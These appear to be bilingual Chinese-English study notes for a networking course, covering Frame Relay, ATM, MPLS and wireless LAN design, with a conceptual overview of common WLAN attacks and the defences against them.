- 做路由器的背靠背实验时两个路由器一个做为DCE一个做为DTE，做
DCE的需要配置clock rate
- ISDN用64000，或是分时隙的用64000，只有普通拨号串口用56000，设
定好DTE，DCE，DTE，DCE的时钟速率要一致
- 如果不能确定哪台路由器拥有这条线缆的DTE端，哪台路由器拥有DCE
端，可以利用show controller serial 0来确定
Frame Relay 訊框中繼 (Layer 2 technology)
- Before cable modems and DSL connections, Frame Relay was WAN
technology choice for many companies. 是一⻔相对比较老的WAN 连接方式，同时它也是一种WAN封装协议，目前企业已经很少使用 了，当然目前很多银行的ATM机还在使用该业务(它符合安全性、 稳定性、可靠性和可扩展性并且传输速率要求不高、成本低的业务
需求)。
- offers widespread availability and relatively low cost compared to leased lines.
- Frame Relay 運作於 data link layer (OSI layer 2)，用简化的方法传送和 交换数据单元的一种技术。會將上層的資料封裝起來。
◦ IP網路封包會被封裝成Frame的格式，這樣才能在訊框中繼網路上跨 网傳輸.
◦ 帧中继网络一般由Internet Service Provider(ISP)提供搭建
▸ 到当地的ISP办理帧中继业务，
▸ 然后把本地局的局域网连接到ISP提供的设备上(DCE)，并
“适当地配置”就可以使用了。
▸ 例如，如果要从公司总部连接7 个新增的远程场点，但路由器只
有一个空闲的串行端口，则可使用帧中继来救场! 当然，这 也会导致单点故障，不太好。 ▸ 帧中继是用来节省费用的，而不是用来提高网络弹性的。
- 定義了介於router和Internet Service Provider(ISP)的交換機設備之間的 互動連線
- 並沒有定義網路封包如何被傳送。
- 運作在所有支援Point-to-point的實體Serial連線，也支援連到服務供應
商的訊框中繼連線。
- Unlike a dedicated leased line, Frame Relay shares a service provider’s bandwidth with other customers of its service provider.
◦ Therefore, subscribers might purchase an SLA to guarantee a minimum level of service.
◦ In SLA terms, a minimum bandwidth guarantee is called a
committed information rate (CIR).
◦ Committed Information Rate (CIR): 承诺信息速率/ 資料約定速 率 kbit/s
◦ 是帧中继电路上最高的平均数据传输率。它通常比传输速率慢;
◦ 当传输突发数据时，传输速度可以超过CIR。
◦ CIR是控制你的最大传输速度的,如果电信网络有足够资源，客户最
大可达到的传输速度可达到访问速率(即T1)的速率。相反如
果没有足够资源,超过CIR的速率时, 有可能被丢弃。
▸ 用户在ISP那里办理帧中继服务时，可以根据业务需求选择一个
带宽，如:512K、1M、T1、2M等，这个带宽速率就是
CIR，是ISP为用户保证的基础带宽速率。
◦ 但是virtual circuits的传输能力采用的是动态的按需分配原则，在传
输数据期间，网络会提供CIR，并根据当前的网络使用率，允许 有一定的扩展，在用户没有数据发送时，virtual circuits 仍然保 持连接关系，但是网络可以把设备的传输能力用作其他服务，所 以虚电路不会独占带宽(这一点和专线不一样)。
- 帧中继主要特点:
◦ 帧中继提供的是一种面向连接的传输服务
▸ 用户在本地传输data将按照顺序通过网络到达终点，
▸ 对端在接收数据时不需要重新排序收到的数据。
▸ 帧中继在传输数据前会通过网络和对方建立逻辑上的通路, virtual circuits (VC). 虛擬線路. ◦ 那么什么叫做“面向有连接的服务”呢? ▸ 数据在传输前已经建立了固定连接
▸ 用户始终使用这一信道传输数据，不会发生信息错序的问题。 ◦ 和此对应的是“面向无连接的网络服务”，
▸ 数据在传输之前不建立固定的连接，
▸ 用户发送的数据可能会通过不同的path(选路的结果)到达终
点，
▸ 所以终点接收到的数据顺序和对方发送的顺序可能不一致，从
而需要重新排序。
▸ Example: 由Router搭建的网络。
- Frame Relay sites are interconnected using virtual circuits (VC). 虛擬
線路
◦ a single router interface can have multiple virtual circuit (VCs).
- These VCs could be:
◦ point-to-point circuits:
▸ VC between New York and Austin belongs to the same IP subnet,
▸ VC between New York and Orlando belongs to a separate subnet.
◦ point-to-multipoint connection,
▸ the connection from New York to Austin and Orlando, all
routers belong to the same subnet.
- virtual circuits 有两种: 永久虚电路(PVC)和交换虚电路(SVC)
- permanent virtual circuit (PVC) 永久性虛擬線路:
◦ VC is always connected, 永久建立，类似专线，
◦ 由ISP在帧中继交换机上用静态交换表定义，不论用户是否进行传
     输，这条线路都一直存在。
◦ 對於資料終端設備(DTE)之間的 訊框中繼網路 提供這樣的永久性
連線。
◦ PVC 的連線並不需要像 SVC 一樣還需要建立連線(Setup)以及關
閉連線(Teardown)等等的過程。
- switched virtual circuits (SVC) 交換式虛擬線路: ◦ some VCs can be brought up on an as-needed basis, 临时建立. 在传 输前动态建立，在传输完成后线路就会被拆除断开。目前，最常 ⻅的是使用PVC!
◦ 提供服務的對象是位於訊框中繼網路內的資料終端設備(DTE)
◦ 在使用交換式虛擬線路之前，必須建立連線，當然這種建立的動作
是依據需求才產生的，也就是On demand，而當連線結束之 時，也必須關閉連線。Cisco IOS在11.2之後的版本開始支援交換 式虛擬線路。
- Frame Relay Traffic Shaping (FRTS):
◦ CIR and BECN configurations are both considered elements of Frame Relay Traffic Shaping (FRTS).
- 帧中继具有拥塞控制能力:
◦ 当网络发生拥塞时，帧中继switch会向发送端和接收端的设备发送
拥塞通知，要求设备降低发送速率。
◦ 必要时，还会丢掉一些已经接收到的数据包。
- 帧中继的帧封装和帧格式 - Frame的封包:
◦ 1. 标志: 表示帧的开始和结束。
▸ Opening flag，起始開放欄位(0x7E)
◦ 2. 位址: 用于帧的寻址(2bytes, 16bits) ▸ 10 bits: 儲存線路ID，(DLCI)
▸ 6 bits: 儲存網路壅塞控制。
◦ 3.資料:
▸ 帧携带的数据，⻓度可以变，一般不能超过4096个字节。
▸ 儲存的資料包含由OSI 上層網路協定傳送過來並且已經封裝起
來的資料。
◦ 4. FCS (Frame Check Sequence) 帧校验序列。
▸ 用來檢查這個封包所可能發生的錯誤。
◦ 5. 标志: 表示帧的开始和结束。 - 帧中继的头部格式:
◦ data link connection identifier (DLCI): 数据链路连接标识符
▸ 帧中继使用的地址是二层地址，称为 数据链路标识符 (DLCI)。
▸ significant identifiers used by router for each VC. Only for locally VC
▸ DLCI的用途是搭建虚电路，它不具有唯一性，不同用户的帧中 继连接可以使用相同的DLCI。DLCIs at the different ends
of a VC do not need to match (although they could). ▸ 总共10bit，用于目标设备的寻址。
▸ DLCI取值范围为0-1007
- 0 用于信令;
- 1~15 保留;
- 16~991 用于VC识别;
- 992~1007 用于层管理。
▸ 只有作为DCE的设备启用了子接口才能配置DLCI。
- 在帧中继的应用中，DCE端都被设置在ISP一侧，用户的
router属于DTE段，所以如果用户的router没有使用子接
口，就不需要配置DLCI。
▸ 在DTE router上用show frame-relay map命令可以查看本端
DLCI值.
12.12.12.2 50 表示IP12.12.12.2(对端)与DLCI 50(本端)
对应，
只要发送给12.12.12.2的数据就直接从DLCI 50的接口发送出
去，
12.12.12.1 80表示只要发送给12.12.12.1的数据就从DLCI为
80的接口发送出去。 IP和DLCI的对应关系与IP和MAC的对应关系道理是类似
的。
▸ Router ABC, A:B 200:300, A:C 400:500. ◦ C/R:命令/响应(未用)。
◦ EA: 0表示地址字段未结束;1 表示地址字段结束。
◦ Forward explicit congestion notification (FECN) bit: 前向显示拥
- - - - 塞通告
▸ 位於訊框中繼網路封包表頭中，位址欄位內的一個位元。 ▸ 當router等 DTE 發送訊框中繼網路封包到網路中的時候，
FECN的機制就會被初始化，
▸ 这个信息告诉路由器接收的帧在所经通路上发生过拥塞。
▸ 由来源(发送)终端传输, 要目的地(接收)终端减缓数据要求
的请求的首位
▸ 一旦網路發生壅塞的情況，訊框中繼交換機(DCE設備)就會
把這個FECN的值設定成1。
▸ 當Frame Relay網路封包從Frame Relay交換機(DCE)以反方
向發送回給路由器等資料終端設備(DTE), 而且FECN的值 為1的時候，訊框中繼交換機(DCE設備)就會把BECN的 值也設定為1。
◦ backwards explicit congestion notification (BECN) bit: 倒行/后向 显示拥塞通告
▸ 由目的地终端传输的要来源终端更慢地发送数据的请求的首 位。
▸ 这个信息设置在遇到拥塞的帧上，而这些帧将沿着与拥塞帧相 反的方向发送。这个信息用于帮助高层协议在提供流控时采 取适当的操作。
▸ During times of congestion, a service provider need a sender to reduce his transmission rate below its CIR.
•
•
service provider setting the BECN bit in the Frame Relay header of a frame destined for the sender that needs to slow down.
If the sender is configured to respond to BECN bits, it can reduce its transmission rate by as much as 25 percent per timing interval (which is 125 ms by default).
◦ Discard Eligible (DE) bit:
▸ frames sent in excess of the CIR have the Discard Eligible (DE) bit in their header set.
▸ When Frame Relay service provider experiences congestion, they first drop frames marked with DE bit.
▸ 这个信息为帧设置了一个种级别指示，指示当拥塞发生时一个 帧能否被丢弃。DE=1表示 此帧可优先舍弃。 ▸ 很多比較便宜的訊框中繼網路服務的資料約定速率都是0，當然 若資料約定速率為0，則所有網路封包所運行的速率都比較 快，也就是說，所有的網路封包都會被貼上DE的標籤，而 這同時也代表著，一旦這樣的訊框中繼網路受不了時將會丟 棄所有的網路封包。所以，便宜的同時也要注意一下所可能 帶來的風險。
- 帧中继的封装有两种格式:CISCO和IETF，两种封装略有不同，不能兼 容。CISCO设备默认的封装格式为CISCO，但是也支持IETF，国内 的帧中继线路多采用IETF。
Cisco的路由器支援以下這幾種Serial連線: - EIA/TIA-232,
- EIA/TIA-449
- EIA/TIA-530
- V.35 - X.21
訊框中繼網路協定用語
Local Access Rate 本地端存取速率:
- Local Loopn連到Frame Relay網路區段的頻寬(Port Speed/Clock
Speed), 指進出這個訊框中繼網路的資料傳輸速率.
- 路由器與中間這個網路雲所連接的網路速度就是指Local Access Rate.
Inverse Address Resolution Protocol，Inverse ARP
- 這是可以找尋DLCI以及遠端router在網路層的位址。
- Inverse ARP可以讓router自動去搜尋虛擬線路另一端的資料終端設備的
位址。
Local Management Interface (LMI) 帧中继本地管理接口
- 訊號標準，用於路由器等資料終端設備(DTE設備)和訊框中繼交換機
(DCE設備)之間
- 用來負責這兩者之間的連線管理與維護的功能。
- LMI用于本地router和它连接的第一台帧中继switch之间，允许提供商 网络和DTE( 本地路由器)交流有关virtual circuits的运行情况和状态
方面的信息，包括如下方面:
◦ 存活消息:验证是否正在传输数据。
◦ 组播:这是一个可选的LMI 规范扩展，借助它，能够通过帧中继网
络有效地分发路由选择信息和ARP 请求。组播使用保留的DLCI-
I019-1022 。
◦ 全局编址:让DLCI 有全局意义，让帧中继云就像LAN 一样。到目
     前为止，从未在生产网络中使用过它。
◦ virtual circuits状态:提供DLCI 状态。在没有定期发送LMI数据流
时，状态查询和消息将用作存活消息。路由器通过使用帧中继封 装的接口，从服务提供商的帧中继交换机那里收到LMI 信息 后，将虚电路的状态更新为下述3 种状态之一:
▸ 活动状态:一切正常，路由器可彼此交换信息。
▸ 非活动状态:路由器接口处于up 状态，并建立了到交换局的连
接，但远程路由器处于down状态。
▸ 拆除状态(deleted state ): 没有收到交换机的LMI 信息，这可
       能是由映射问题或线路故障导致的。
◦ LMI 不在客户路由器之间交换信息，而在客户路由器和最近的帧中
继交换机之间交换信息。因此，完全可能出现这样的情况: PVC 一端的路由器在接收LMI 信息，而另一端的路由器没有。当 然，在一端处于down 状态的情况下， PVC 不能正常工作，这 里指出上述情形旨在阐明L阳通信的本地特征。
◦ LMI提供了帧中继的扩展特性，它的主要作用提供了帧中继连接状 态的检测服务。LMI由多个定时器和计数器组成，目前的LMI有 三个版本:ANSI、Q933a和CISCO。用户路由器使用的LMI类 型必须与ISP的LMI类型一致。CISCO路由器的LMI默认类型为 CISCO。如果ISP的LMI不是CISCO，需要修改为效应类型。早 期的路由器需要手工指定本端的LMI类型，现在的路由器一般可 以自动识别DCE一侧的LMI类型并自动调整为相应的类型。手动 配置可以用以下命令:frame-relay lmi-type {ansi|q933a|cisco}
Asynchronous Transfer Mode ◦ Layer 2 WAN technology, operates using the concept of PVCs and SVCs.
◦ But ATM uses fixed-length cells as its protocol data unit (PDU), Frame Relay use variable frames.
- an ATM cell contains a 48-byte payload and a 5-byte header.
◦ the fields of an ATM header:
◦ Generic Flow Control (GFC) field:
▸ uses 4 bits to locally indicate a congestion condition.
◦ Virtual Circuit Identifier (VCI) field:
▸ usually uses 16 bits to indicate a VC.
▸ However, to fully identify a VC, the virtual path within which
that VC resides must also be defined.
◦ Virtual Path Identifier (VPI) field:
▸ uses 8 bits to identify an ATM virtual path, which could contain multiple virtual circuits.
◦ Payload Type Indicator (PTI) field:
▸ uses 3 bits to indicate the type of payload being carried in a cell (like user data versus ATM management data).
◦ Header Error Control (HEC) field:
▸ uses 8 bits to detect and correct errors in an ATM cell header.
- An ATM cell’s 48-byte payload size resulted from a compromise between the wishes of different countries as an international standard for ATM was being developed.
- Some countries, such as France and Japan, wanted a 32-byte payload size (smaller payload sizes worked well for voice transmission)
- However, other countries, including the United States, wanted a 64- byte payload size, (better support the transmission of both voice and data)
- In the end, the compromise was to use the average of 32 bytes and 64 bytes (that is, 48 bytes).
- Although ATM uses VCs to send voice, data, and video, those VCs are not identified with DLCIs.
- Rather, ATM uses a pair of numbers to identify a VC.
◦ One of the numbers represents the identifier of an ATM virtual
path.
◦ A single virtual path can contain multiple virtual circuits
- a virtual path is labeled with a virtual path identifier (VPI),
- a virtual circuit is labeled with a virtual circuit identifier (VCI). - Therefore, an ATM VC can be identified with a VPI/VCI pair of numbers.
◦ Example:100/110: VC with a VPI of 100 and a VCI of 110.
- In ATM network topology:
- user-network interfaces (UNI): interconnections between ATM
switches and ATM endpoints
- network- node interfaces (NNI): interconnections between ATM
switches
Multiprotocol Label Switching (MPLS)
- growing in popularity as a WAN technology used by service providers.
- This growth in popularity, MPLS’ capability:
◦ support multiple protocols on the same network.
▸ an MPLS network can accommodate users connecting via Frame Relay or ATM on the same MPLS backbone.
◦ perform traffic engineering (allows traffic to be dynamically routed within an MPLS cloud based on current load conditions of specific links and availability of alternate paths).
- MPLS inserts a 32-bit header between Layer 2 and Layer 3 headers, a Layer 2 1/2 technology.
- Because this header is shimmed 填隙 between the Layer 2 and Layer 3 headers, as called a shim header.
- The 32-bit header contains a 20-bit label.
◦ This label is used to make forwarding decisions within an MPLS
cloud.
◦ Therefore, the process of routing MPLS frames through an MPLS
cloud is commonly referred to as label switching. - MPLS network elements:
- customer premise equipment (CPE):
◦ device resides at a customer site.
◦ connects a customer with an MPLS service provider.
◦ Example: A router.
- edge label switch router (ELSR):
◦ resides at the edge of an MPLS service provider’s cloud
◦ interconnects a service provider to one or more customers.
- label switch router (LSR):
◦ resides inside a service provider’s MPLS cloud
◦ makes frame-forwarding decisions based on labels applied to
frames.
- An MPLS frame does not maintain the same label throughout the MPLS cloud.
◦ an LSR receives a frame,
◦ examines the label on the frame,
◦ makes a forwarding decision based on the label,
◦ relabels the frame,
◦ and forwards the frame to the next LSR.
◦ This process of label switching is more efficient than routing based
on Layer 3 IP addresses. Summary
- This chapter identified the three categories of WAN connections: dedicated leased lines, circuit-switched connections, and packet- switched connections.
- Data rates of various WAN technologies were contrasted.
- Various types of WAN media were identified.
◦ physical media (unshielded twisted pair (UTP), coaxial cable, fiber- optic cable, electric power lines)
◦ wireless technologies (cellular phone, satellite, WiMAX, HSPA+, radio technologies).
- The basic theory and operation of various WAN technologies:
◦ dedicated leased line, digital subscriber line (DSL), cable modem,
Synchronous Optical Network (SONET), satellite, Plain Old Telephone Service (POTS), Integrated Services Digital Network (ISDN), Frame Relay, Asynchronous Transfer Mode (ATM), and Multiprotocol Label Switching (MPLS). Define Key Terms
- dedicated leased line, circuit-switched connection, packet-switched connection,
•
- optical carrier, T1, E1, T3, E3,
- channel service unit/data service unit (CSU/DSU), •
- Point-to-Point Protocol (PPP),
◦ Password Authentication Protocol (PAP),
◦ Challenge-Handshake Authentication Protocol (CHAP),
◦ Microsoft Challenge-Hand-shake Authentication Protocol (MS-
CHAP),
◦ Point-to-Point Protocol over Ethernet (PPPoE),
- Microsoft Routing and Remote Access Server (RRAS),
- digital subscriber line (DSL), cable modem, Synchronous Optical
Network (SONET), satellite (WAN technology),
- Public Switched Telephone Network (PSTN), Plain Old Telephone
Service (POTS),
- telco, local loop, central office (CO), tip and ring, demarc, •
- Integrated Services Digital Network (ISDN),
- basic rate interface (BRI), primary rate interface (PRI), •
- Frame Relay, •
- Asynchronous Transfer Mode (ATM), •
- Multiprotocol Label Switching (MPLS),
◦ customer premise equipment (CPE), edge label switch router (ELSR), label switch router (LSR)
Connecting Wirelessly 8
Foundation Topics
Introducing Wireless LANs (WLAN) WLAN Concepts and Components
- Wireless devices, such as laptops and smart phones, often have a built- in wireless card that allows those devices to communicate on a WLAN.
- But, what is the device to which they communicate?
◦ another laptop with a wireless card (ad-hoc WLAN).
◦ connects to some sort of a wireless base station, such as a wireless
access point (AP) or a wireless router.
- This communication might be done using a variety of antenna types,
frequencies, and communication channels.
- The following sections consider some of these elements in more detail.
- Wireless Routers
- Such a WLAN might be found in a residence whose Internet access is provided by digital subscriber line (DSL) modem. In this topology, a wireless router and switch are shown as separate components.
- However, in many residential networks, a wireless router integrates switch ports and wireless routing functionality into a single device.
- Basic WLAN Topology with a Wireless Router
◦ the wireless router obtains an IP address via DHCP from the
Internet service provider (ISP).
◦ Then, the router uses Port Address Translation (PAT), provide IP
addresses to devices attaching to it wirelessly or through a
wired connection.
◦ The process through which a wireless client (like laptop or smart
phone) attaches with a wireless router (or wireless AP) is called
association.
◦ All wireless devices associating with a single AP share a collision
domain.
◦ Therefore, for scalability and performance reasons, WLANs might
include multiple APs.
- Wireless Access Point (AP)
- Although a wireless access point (AP) interconnects a wired LAN with a WLAN, it does not interconnect two networks (like the service provider’s network with an internal network).
- connects: the wired LAN - AP - wireless devices (connect to the wired LAN via the AP) are on the same subnet as the AP (no Network Address Translation [NAT] or PAT is being performed). - Antennas 天线;触⻆
- The coverage area of a WLAN: largely determined by the type of
antenna used on a wireless AP/router.
◦ lower-end, consumer-grade wireless APs have fixed antennas,
◦ higher-end, enterprise-class wireless APs often support various
antenna types.
- selecting an antenna:
◦ Required distance between an AP and a wireless client.
◦ Pattern of coverage area: (like might radiate out in all
directions[spherical coverage area around an antenna] or
provide increased coverage in only one or two directions).
◦ Indoor or outdoor environment.
◦ Avoiding interference with other APs.
- Antennas are classified by gain and their coverage area.
- The strength of the electromagnetic waves being radiated from an
antenna: gain增益,
◦ which involves a measurement of both direction and efficiency of a
transmission. ◦ Example:
▸ the gain measurement for a wireless AP’s antenna transmitting a signal.
- how efficiently the power being applied to the antenna is converted into electromagnetic waves being broadcast in a specific direction.
▸ the gain measurement for a wireless AP’s antenna receiving a signal.
- how efficiently the received electromagnetic waves arriving from a specific direction are converted back into electricity leaving the antenna.
- Gain is commonly measured using the dBi unit of measure (decibels and isotropic 等方性的).
- decibels 分⻉: a ratio of radiated power to a reference value.
◦ In dBi, the reference value is the signal strength (power) radiated
from an isotropic antenna.
▸ theoretical antenna: radiates an equal amount of power in all
directions (in spherical 球形的pattern).
▸ An isotropic antenna is considered to have gain of 0 dBi.
- The most common formula used for antenna gain: GdBi = 10 * log^10
(G) ◦ Based on this formula, an antenna with a peak power gain of 4 (G) would have a gain of 6.02 dBi.
- Antenna theory can become mathematical (heavily relying on the use of Maxwell’s equations). However, to put this discussion in perspective, generally speaking, if one antenna has 3 dB more gain than another antenna, it has approximately twice the effective power.
- Two broad categories of antennas based on coverage area:
◦ Omnidirectional antenna 全方向的:
▸ Radiates power at relatively equal power levels in all directions (somewhat similar to the theoretical isotropic antenna).
▸ Omnidirectional antennas are popular in residential WLANs and small office/office (SOHO) locations.
◦ Unidirectional 单向的:
▸ focus their power in a specific direction, avoiding potential interference with other wireless devices.
▸ perhaps reaching greater distances than omnidirectional antennas.
▸ Example: interconnecting two nearby buildings.
- Another consideration for antenna installation is the horizontal or vertical orientation of the antenna.
- For best performance, if two wireless APs communicate with one another, they should have matching antenna orientations, which is referred to as the polarity of the antenna. Frequencies and Channels
- a variety of wireless standards, which are all variants of the IEEE 802.11 standard.
- contrast one standard versus another: the frequencies at which these standards operate.
- Although there are some country-specific variations, certain frequency ranges/bands have been reserved internationally for industrial, scientific, and medical purposes.
- These frequency bands are called the ISM bands (ISM: industrial, scientific, and medical)
- Two of these bands are commonly used for WLANs.
- Specifically, WLANs can use the range of frequencies in:
◦ the 2.4 GHz–2.5 GHz range (comm. 2.4-GHz band)
◦ or the 5.725 GHz–5.875 GHz range (comm. 5-GHz band).
◦ some WLANs support mixed environment (2.4 GHz devices run
alongside 5-GHz devices).
- Within each band are specific frequencies/channels at which wireless devices operate.
- To avoid interference, nearby wireless APs should use frequencies that do not overlap one another.
- Selecting different channels is not sufficient, because transmissions on one channel spill over into nearby channels.
◦ Example, consider the 2.4-GHz band.
▸ channel frequencies are separated by 5 MHz (with the
exception of channel 14, which has 12 MHz of separation
from channel 13).
▸ However, a single channel’s transmission can spread over a
frequency range of 22 MHz.
▸ As a result, channels must have five channels of separation (5 *
5 MHz = 25 MHz, which is greater than 22 MHz).
◦ in the United States, you could select non-overlapping channels of
1, 6, and 11.
- NOTE Even though some countries use channel 14 as a non overlapping channel, it is not supported in the United States.
- The 5-GHz band has a higher number of channels, as compared to the 2.4-GHz band.
- Note that additional channels are supported in some countries. - Table 8-1 shows the specific frequencies for each of the channels in the 2.4-GHz band.
- Table 8-2 lists the recommended non overlapping channels for the 5- GHz band in the United States.
WLAN Standards
•
•
•
- •
•
Most modern WLAN standards are variations of the original IEEE 802.11 standard (1997).
◦ IEEE 802.11 standard supported a DSSS and a FHSS implementation (both operated in 2.4-GHz band)
original 802.11 standard lacks sufficient bandwidth for today’s WLANs (with supported speeds of 1 Mbps or 2 Mbps)
802.11a (1999)
◦ Other supported data rates (if conditions not suitable for the 54 Mbps): 6, 9, 12, 18, 24, 36, 48 Mbps.
◦ 802.11a never gained widespread adoption, because it was not backwards compatible with 802.11b, while 802.11g was backwards compatible.
802.11b (1999)
◦ supports speeds as 11 Mbps. However, 5.5 Mbps is another supported data rate.
802.11g (2003)
◦ Like 802.11a, other supported data rates include 6, 9, 12, 18, 24, 36, and 48 Mbps.
◦ 802.11g allows it to offer backwards compatibility to 802.11b devices.
802.11n (2009)
◦ supports a wide variety of speeds, depending on its implementation.
◦ Although the speed of an 802.11n network could exceed 300 Mbps (use channel bonding), many 802.11n devices on the market have speed ratings in the 130–150 Mbps range.
◦ technology implemented by 802.11n:
▸ multiple input, multiple output (MIMO).
- uses multiple antennas for transmission and reception.
- These antennas do not interfere with one another, thanks
to MIMO’s use of spatial multiplexing (encodes data based on the antenna from which the data will be transmitted.) MIMO’s simultaneous use of multiple antennas.
▸ channel bonding
- two wireless bands can be logically bonded together,
forming a band with twice the
- bandwidth of an individual band.
- Some literature refers as 40-MHz mode, refers to the
bonding of two adjacent 邻近的 20-MHz bands into a 40-MHz band.
Deploying Wireless LANs
- When designing and deploying WLANs, you have a variety of installation options and design considerations. This section delves into your available options and provides you with some best practice recommendations.
Types of WLANs
•
•
◦ WLANs can be categorized based on their use of wireless APs.
◦ Three main categories:
IBSS - independent basic service set (ad-hoc fashion)
◦ IBSS WLANs: WLAN can be created without AP.
◦ work in an ad-hoc fashion 特设的:
▸ ad-hoc WLAN is useful for temporary connections between wireless devices.
◦ Example: you might temporarily interconnect two laptop computers to transfer a few files.
BSS - basic service set (infrastructure mode)
◦ BSS WLANs: WLANs using a single AP.
◦ run in infrastructure mode 基础设施:
▸ because wireless clients connect to an AP, typically connected to a wired network infrastructure.
◦ A BSS network is often used in residential/SOHO locations。
▸ the signal strength provided by a single AP is sufficient for all
clients.
ESS - extended service set (infrastructure mode)
◦ ESS WLANs: WLANs containing more than one AP.
◦ run in infrastructure mode 基础设施
◦ more than one AP:
▸ take care to prevent one AP from interfering with another. 3,053 ▸ Specifically, the previously discussed non overlapping channels (channels 1, 6, and 11 for the 2.4-GHz band) should be selected for adjacent wireless coverage areas.
- Sources of Interference
- A major issue for WLANs is radio frequency interference (RFI) caused by other devices using similar frequencies to the WLAN devices.
- Also, physical obstacles 障碍(物) can impede or reflect WLAN transmissions.
- The following are some of the most common sources of interference:
◦ Other WLAN devices:
▸ non overlapping channels for both the 2.4-GHz and 5-GHz bands.
▸ However, if two or more WLAN devices are in close proximity and use overlapping channels, those devices could interfere with one another.
◦ Cordless phones:
▸ Several cordless phones operate in the 2.4-GHz band and can interfere with WLAN devices.
▸ However, if you need cordless phones to coexist in an environment with WLAN devices using the 2.4-GHz band
- •
use digital enhanced cordless telecommunications (DECT) cordless phones.
Although the exact frequencies used by DECT cordless phones vary based on country, DECT cordless phones do not use the 2.4-GHz band.
▸ Example, in the US, DECT cordless phones use frequencies in the range 1.92 GHz–1.93 GHz.
◦ Microwave ovens:
▸ Older microwave ovens
- ot have sufficient shielding
- can emit 发出 relatively high-powered signals in the 2.4- GHz band
- resulting in significant interference with WLAN devices operating in the 2.4-GHz band.
◦ Wireless security system devices:
▸ Most wireless security cameras operate in 2.4-GHz frequency range,
- can cause potential issues with WLAN devices.
◦ Physical obstacles: ▸ In electromagnetic theory, radio waves cannot propagate 传播 through a perfect conductor导体.
▸ So, although metal filing cabinets and large appliances器具 are not perfect conductors, they are sufficient to cause degradation of a WLAN signal.
▸ Example,
- a WLAN signal might hit a large air conditioning unit
- radio waves to be reflected and scattered 分散的 in multiple directions.
- limit the range of the WLAN signal,
- radio waves carrying data might travel over different
paths.
- This multipath issue can cause data corruption.
◦ Signal strength:
▸ The range of a WLAN device is a function of the device’s signal strength.
▸ Lower-cost consumer-grade APs do not typically allow an administrative adjustment of signal strength.
▸ However, enterprise-class APs often allow signal strength to be adjusted
- to assure sufficient coverage of a specific area
- avoiding interference with other APs using the same
channel.
- As you can see from this list, most RFI occurs in the 2.4-GHz band as
opposed to the 5-GHz band.
- Therefore, depending on the wireless clients you need to support, you
might consider using the 5-GHz band, which is an option for 802.11a and 802.11n WLANs.
Wireless AP Placement
- WLANs using more than one AP (an ESS WLAN) require:
◦ careful planning to prevent the APs from interfering with one
another,
◦ servicing a desired coverage area.
- Specifically, an overlap 重叠 of coverage between APs should exist, to
allow uninterrupted 连续的 roaming漫游 from one WLAN cell (the
coverage area provided by an AP) to another.
◦ However, those overlapping coverage areas should not use
overlapping frequencies.
◦ Figure 8-9 shows how non overlapping channels in the 2.4-GHz band can overlap their coverage areas to provide seamless 无缝
的 roaming between AP coverage areas.
- A common WLAN design recommendation: have a 10–15 percent
overlap of coverage between adjoining cells.
- If a WLAN has more than three APs, the APs can be deployed in a
honeycomb fashion:
◦ to allow an overlap of AP coverage areas while avoiding an
overlap of identical 同一的 channels.
◦ cells using the same non overlapping channels (channels 1, 6, and
11) are separated by another cell.
▸ Example, none of the cells using channel 11 overlap another
cell using channel 11.
◦ honeycomb channel assignment scheme be used for the 5-GHz
band: identical channels should be separated by at least two cells, rather than the single cell shown for the 2.4 GHz band.
Securing Wireless LANs
Security Issues
war dialing:
  - dial-up modems were popular,
  - malicious users run program on computer to call all phone numbers in
a certain number range.
  - Phone numbers that answered became targets for later attacks.
war driving:
  - variant of war dialing
  - malicious users drive around looking for unsecured WLANs for
nefarious purposes or simply looking for free Internet access.
  - Solutions:
  - Change antenna placement
  - Adjust power level controls. War chalking 用粉笔写:
  - Once an open WLAN (or a WLAN whose SSID and authentication credentials are known) is found in a public place
  - user might write a symbol/structure on a wall
  - let others know the characteristics of this network. WEP and WPA security cracking 破裂: authenticating a WLAN client with an AP.   - two less secure standards:
  - Wired Equivalent Privacy (WEP),
  - Wi-Fi Protected Access (WPA).
  - more secure than WEP,
  - but cracking utilities are available on the Internet for cracking
each of these.
  - By collecting enough packets transmitted by a secure AP,
  - use mathematical algorithms to determine the pre-shared key
(PSK) configured on a wireless AP, with which an associating
wireless client must also be configured.
Rogue 流氓 access point / Evil twin:
  - A malicious user set up his own AP (rogue access point) to let
legitimate users connect.
  - then use a packet sniffer (displays info about unencrypted traffic,
including the traffic’s data and header information) to eavesdrop on
communications flowing through their AP.
  - To cause unsuspecting users to connect to the rogue AP:
  - the malicious user configure the rogue AP with the same service set identifier (SSID) as legitimate AP.
  - SSID: a string of characters identifying a WLAN.
  - APs participating in the same WLAN (in an ESS) can be configured
with identical SSIDs.
  - Extended service set identifier (ESSID):An SSID shared among
multiple APs
Approaches to WLAN Security
open authentication: A WLAN that does not require any authentication or provide any encryption for wireless devices (like WLAN in airports).
To protect WLAN traffic from eavesdroppers:
MAC address filtering:
  - Configure AP with a listing of MAC addresses that are permitted to associate.
  - malicious user connect via laptop (whose MAC address is not on the list of trusted MAC addresses), will denied access.
  - drawback:
  - keep an approved list of MAC addresses up-to-date.
  - user could falsify 伪造 the MAC address of his wireless network card, making his device appear to be approved. Disabling SSID broadcast:
  - SSID broadcast by an AP: let users know the name of the WLAN.
  - AP should be configured not to broadcast its SSID.
  - drawback:
  - However, knowledgeable users could still determine the SSID of an AP by examining captured packets.
Pre-shared key:
  - To encrypt transmission and authenticating a wireless client with an AP
  - both the wireless client and the AP could be preconfigured with a pre- shared key-PSK (matching string of characters).
  - The PSK could be used as part of a mathematical algorithm to encrypt traffic,
  - WLAN security based on a PSK technology is called personal mode.
  - eavesdropper intercepted in the encrypted traffic, would not be able to
decrypt the traffic without knowing the PSK.
  - drawback:
  - PSK provide security for a small network, it lacks scalability.
  - Example:
  - For large corporate environment, a PSK being compromised
would necessitate the reconfiguration of all devices configured with that PSK.
IEEE 802.1X:
  - more scalable approach: all wireless users authenticate with their own
credentials (like username and password).
  - No need configure all devices in a WLAN with the same PSK.
  - prevents the compromising 连累 of one password from
impacting the configuration of all wireless devices.
  - allows wireless clients to authenticate with an authentication
server (typically Remote Authentication Dial-In User Service
[RADIUS] server).
  - IEEE 802.1x works in conjunction with an Extensible Authentication
Protocol (EAP) to perform authentication:
  - the overriding goal for each EAP type is:
  - Securely authenticate a supplicant.
   - an authentication framework frequently used in wireless networks and point-to-point connections.    - provides an authentication framework, not a specific authentication mechanism.
  - provide the supplicant and the authenticator a session key, use during a single session in the calculation of security algorithms (like encryption algorithms)
  - EAP types:
  - LEAP - Lightweight Extensible Authentication Protocol
